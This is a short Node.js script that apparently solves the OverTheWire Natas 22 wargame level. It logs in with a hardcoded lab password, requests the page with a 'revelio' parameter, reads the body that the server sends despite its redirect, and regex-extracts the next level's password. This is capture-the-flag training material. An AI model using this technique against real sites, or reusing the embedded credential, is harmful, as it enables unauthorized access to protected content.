const http = require('http');
const querystring = require('querystring');

const authHost = 'natas22.natas.labs.overthewire.org';

const options = {
  base: () => ({
    auth: 'natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=nickontheweb`,
    },
    path: '/index.php?revelio=1',
    port: 80,
  }),
  get: () => ({...options.base(), method: 'GET', hostname: authHost}),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

get().then(body => {
  const wasAuthed = body.match(/Password/);

  wasAuthed ? console.log('Success!') : console.log('Failure!');
  if (!wasAuthed) return;

  const regex = /\n(Password: [a-zA-Z0-9]{32})<\/pre>/;
  const password = body.match(regex)[1];

  console.log(password);
});
